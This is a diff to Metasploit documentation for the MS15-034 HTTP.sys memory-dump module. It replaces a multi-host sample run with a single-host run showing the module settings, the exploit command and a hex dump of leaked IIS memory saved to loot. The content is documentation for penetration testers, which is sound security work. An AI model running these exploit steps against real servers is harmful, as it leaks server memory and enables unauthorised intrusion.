@@ -12,8 +12,8 @@ This module dumps memory contents using a crafted Range header and affects only 
 ## Sample Output
 ```
 msf > use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
-msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.10.141.11-20
-RHOSTS => 10.10.141.11-20
+msf auxiliary(ms15_034_http_sys_memory_dump) > set RHOSTS 10.1.1.125
+RHOSTS => 10.1.1.125
 msf auxiliary(ms15_034_http_sys_memory_dump) > set RPORT 80
 RPORT => 80
 msf auxiliary(ms15_034_http_sys_memory_dump) > show options
@@ -23,7 +23,7 @@ Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
    Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS            10.10.141.11-20  yes       The target address range or CIDR identifier
+   RHOSTS            10.1.1.125       yes       The target address range or CIDR identifier
    RPORT             80               yes       The target port
    SSL               false            no        Negotiate SSL/TLS for outgoing connections
    SUPPRESS_REQUEST  true             yes       Suppress output of the requested resource
@@ -32,86 +32,42 @@ Module options (auxiliary/scanner/http/ms15_034_http_sys_memory_dump):
 
 msf auxiliary(ms15_034_http_sys_memory_dump) > exploit
 
-[+] Target may be vulnerable...
+[+] Target is vulnerable!
+[+] Content length is 10240 bytes
 [+] Stand by...
-
 [+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.11_iis.ms15034_241505.bin
-[*] Scanned  1 of 10 hosts (10% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.12_iis.ms15034_783265.bin
-[*] Scanned  2 of 10 hosts (20% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143459_default_10.10.141.13_iis.ms15034_433508.bin
-[*] Scanned  3 of 10 hosts (30% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143500_default_10.10.141.14_iis.ms15034_663607.bin
-[*] Scanned  4 of 10 hosts (40% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143500_default_10.10.141.15_iis.ms15034_695505.bin
-[*] Scanned  5 of 10 hosts (50% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143501_default_10.10.141.16_iis.ms15034_254486.bin
-[*] Scanned  6 of 10 hosts (60% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143502_default_10.10.141.17_iis.ms15034_393454.bin
-[*] Scanned  7 of 10 hosts (70% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143502_default_10.10.141.18_iis.ms15034_330159.bin
-[*] Scanned  8 of 10 hosts (80% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143503_default_10.10.141.19_iis.ms15034_165710.bin
-[*] Scanned  9 of 10 hosts (90% complete)
-[+] Target may be vulnerable...
-[+] Stand by...
-
-[+] Memory contents:
-
-
-[*] Memory dump saved to /root/.msf4/loot/20170320143504_default_10.10.141.20_iis.ms15034_980170.bin
-[*] Scanned 10 of 10 hosts (100% complete)
+[*] 4854 5450 2f31 2e31 2032 3030 204f 4b0d    HTTP/1.1 200 OK.
+[*] 0a43 6f6e 7465 6e74 2d54 7970 653a 2074    .Content-Type: t
+[*] 6578 742f 6874 6d6c 0d0a 4c61 7374 2d4d    ext/html..Last-M
+[*] 6f64 6966 6965 643a 204d 6f6e 2c20 3232    odified: Mon, 20
+[*] 204a 756e 2032 3031 3520 3134 3a32 313a     Mar 2017 21:27:
+[*] 3535 2047 4d54 0d0a 4163 6365 7074 2d52    55 GMT..Accept-R
+[*] 616e 6765 733a 2062 7974 6573 0d0a 4554    anges: bytes..ET
+[*] 6167 3a20 2261 3563 6663 3863 6166 3661    ag: "a5cfc8caf6a
+[*] 6364 3031 3a30 220d 0a53 6572 7665 723a    cd01:0"..Server:
+[*] 204d 6963 726f 736f 6674 2d49 4953 2f38     Microsoft-IIS/8
+[*] 2e35 0d0a 582d 506f 7765 7265 642d 4279    .5..X-Powered-By
+[*] 3a20 4153 502e 4e45 540d 0a00 0000 0000    : ASP.NET.......
+[*] 0000 0202 4672 6167 0000 0000 0000 0000    ....Frag........
+[*] c028 0000 0000 0000 0000 0000 0000 0000    .(..............
+[*] 0200 0a00 4672 6565 0000 0000 0000 0000    ....Free........
+[*] d01e f6c5 02f8 ffff 40a2 6502 00e0 ffff    ........@.e.....
+[*] 0a00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........
+[*] 1000 6702 00e0 ffff 3800 0c00 0000 0000    ..g.....8.......
+[*] 0000 0000 0000 0000 ba9a e501 00e0 ffff    ................
+[*] 0090 e501 00e0 ffff 5c00 0000 ba0a 0000    ........\.......
+[*] 59a8 1300 0000 0000 0000 0000 0000 0000    Y...............
+[*] 0000 0000 0000 0000 0000 0000 0000 e0dc    ................
+[*] 0d00 0d02 4d64 6c20 0000 0000 0000 0000    ....Mdl ........
+[*] 9079 2602 00e0 ffff 3800 1c00 0000 0000    .y&.....8.......
+...
+...
+...
+[*] 6079 0702 00e0 ffff 0000 0000 0000 0000    `y..............
+[*] 0e00 1902 5669 4d6d 0000 0000 0000 0000    ....ViMm........
+[*] Suppressed 346 uninteresting lines
+[*] Memory dump saved to /home/rw/.msf4/loot/20150622073911_default_10.1.1.125_iis.ms15034_145400.bin
+[*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf auxiliary(ms15_034_http_sys_memory_dump) > 
 ```
